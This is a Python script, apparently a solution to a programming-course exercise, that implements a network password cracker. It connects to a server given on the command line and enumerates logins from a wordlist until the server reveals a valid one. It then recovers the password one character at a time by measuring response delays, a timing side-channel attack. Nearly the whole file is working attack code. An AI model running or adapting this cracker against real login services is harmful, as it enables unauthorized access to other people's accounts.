from datetime import datetime
import itertools
import json
import socket
import string
import sys


class WordGenerator:
    """
    Generates passwords or logins. It takes values: characters, min_length, max_length, and filepath.
    If the filepath to a word dictionary is provided, the generator returns the words from the dictionary.
    Otherwise, it generates them based on provided character set and length range.
    """

    def __init__(self, characters=string.ascii_letters + string.digits, min_length=1, max_length=8, filepath=''):
        self._characters = characters
        self.min_length = min_length
        self._max_length = max_length
        self._filepath = filepath

    def __iter__(self):
        # If no filepath provided, generate the words
        if not self._filepath:
            for length in range(self.min_length, self._max_length + 1):  # Include max_length in the range
                for word in itertools.product(self._characters, repeat=length):
                    yield ''.join(word)
        # If filepath provided, read from the file
        else:
            with open(self._filepath, 'r') as f:
                yield from f


class PasswordCracker:
    """
    Uses brute-force technique to find correct login and password.
    Utilizes two WordGenerators: one for logins and another for passwords.
    """

    def __init__(self):
        self.server_address = sys.argv[1]
        self.server_port = int(sys.argv[2])
        self.logins = WordGenerator(filepath='/Users/ts/Downloads/logins.txt')  # Adjust the path accordingly
        self.passwords = WordGenerator()

    @staticmethod
    def generate_case_variants(word):
        """
        Generates all possible case combinations for the given word.
        """
        for variant in [''.join(i) for i in itertools.permutations(word + word.upper(), len(word))
                        if ''.join(i).lower() == word]:
            yield variant

    def crack(self):
        """
        Connects to the server and tries to find the valid login and password.
        """
        with socket.socket() as client_socket:
            client_socket.connect((self.server_address, self.server_port))

            # Identify a valid login
            valid_login = ''
            for login in self.logins:
                request = json.dumps({'login': login.strip(), 'password': ' '})
                client_socket.send(request.encode())
                response = client_socket.recv(1024)
                server_response = json.loads(response.decode())
                if server_response['result'] == 'Wrong password!':
                    valid_login = login.strip()
                    break

            # Identify the correct password
            valid_password = ''
            while server_response['result'] != 'Connection success!':
                for char in string.ascii_letters + string.digits:
                    request = json.dumps({'login': valid_login, 'password': valid_password + char})
                    client_socket.send(request.encode())

                    start_time = datetime.now()
                    response = client_socket.recv(1024)
                    time_difference = datetime.now() - start_time

                    server_response = json.loads(response.decode())
                    if time_difference.total_seconds() > 0.1 or server_response['result'] == 'Connection success!':
                        valid_password += char
                        break
            print(request)


if __name__ == '__main__':
    cracker = PasswordCracker()
    cracker.crack()
